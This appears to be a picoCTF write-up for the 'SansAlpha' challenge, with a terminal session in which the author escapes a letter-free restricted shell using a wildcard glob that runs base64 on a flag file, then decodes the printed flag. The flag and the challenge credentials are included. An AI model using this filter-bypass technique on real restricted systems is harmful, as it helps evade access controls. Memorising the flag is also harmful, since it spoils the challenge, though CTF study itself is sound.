#### Description

The Multiverse is within your grasp! Unfortunately, the server that contains the secrets of the multiverse is in a universe where keyboards only have numbers and (most) symbols.`ssh -p 59437 ctf-player@mimas.picoctf.net`Use password: `6dd28e9b`


# Solución 

````
alestd-picoctf@webshell:~$ ssh -p 51013 ctf-player@mimas.picoctf.net
The authenticity of host '[mimas.picoctf.net]:51013 ([52.15.88.75]:51013)' can't be established.
ED25519 key fingerprint is SHA256:n/hDgUtuTTF85Id7k2fxmHvb6rrLrACHNM6xLZ46AqQ.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? y
Please type 'yes', 'no' or the fingerprint: yes
Warning: Permanently added '[mimas.picoctf.net]:51013' (ED25519) to the list of known hosts.
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

Traceback (most recent call last):
  File "/usr/local/sansalpha.py", line 12, in <module>
    if user_in[-1] != "\n":
IndexError: string index out of range
Connection to mimas.picoctf.net closed.
alestd-picoctf@webshell:~$ ssh -p 51013 ctf-player@mimas.picoctf.net
ctf-player@mimas.picoctf.net's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 6.5.0-1016-aws x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Last login: Wed Apr 16 22:27:43 2025 from 127.0.0.1
SansAlpha$ /*/???[!_]64 */????.*
cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30=

SansAlpha$ 
Traceback (most recent call last):
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 397, in readline
    keymap.handle_input()
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/keymap.py", line 24, in handle_input
    self.send(key.get())
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/key.py", line 175, in get
    _read(timeout)
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/key.py", line 163, in _read
    _cbuf.extend(getraw(timeout))
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/key.py", line 40, in getraw
    c = getch(timeout)
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/key.py", line 26, in getch
    rfds, _wfds, _xfds = select.select([_fd], [], [], timeout)
KeyboardInterrupt

During handling of the above exception, another exception occurred:

Traceback (most recent call last):
  File "/usr/local/sansalpha.py", line 11, in <module>
    user_in = input("SansAlpha$ ")
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 448, in str_input
    return readline(-1, prompt, float).decode()
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 409, in readline
    control_c()
  File "/usr/local/lib/python3.8/dist-packages/pwnlib/term/readline.py", line 261, in control_c
    raise KeyboardInterrupt
KeyboardInterrupt
Connection to mimas.picoctf.net closed.
alestd-picoctf@webshell:~$ echo cmV0dXJuIDAgcGljb0NURns3aDE1X211MTcxdjNyNTNfMTVfbTRkbjM1NV8xNDUyNTZlY30= | base64 -d
return 0 picoCTF{7h15_mu171v3r53_15_m4dn355_145256ec}



```